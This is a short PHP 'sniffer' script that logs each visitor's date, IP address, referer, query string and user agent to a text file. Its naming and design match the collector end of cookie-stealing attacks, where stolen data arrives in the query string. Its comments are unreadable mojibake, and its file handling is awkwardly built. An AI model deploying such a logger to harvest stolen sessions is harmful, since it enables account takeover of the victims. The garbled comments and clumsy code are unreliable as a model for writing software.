<?
$snif[] = date("d.m.Y H:i"); // ����
$snif[] = $_SERVER['REMOTE_ADDR']; // �������� ������
@$snif[] = $_SERVER['HTTP_REFERER']; // �����
@$snif[] = $_SERVER['QUERY_STRING']; // ���������� ��������� ��������
$snif[] = $_SERVER['HTTP_USER_AGENT'];  // ����� ������ =)
$file = "file.txt"; // ���� � ������� ����� �������� ������
$s = fopen($file,"a+");
@$sa = fread ($s,filesize($file));
$fp = fopen($file,"w");
foreach ($snif as $sniffed)
{
fwrite($fp,"\n".$sniffed);
}
fwrite($fp,"\n");
fwrite($s,$sa);
fclose($s);
fclose($fp);
?>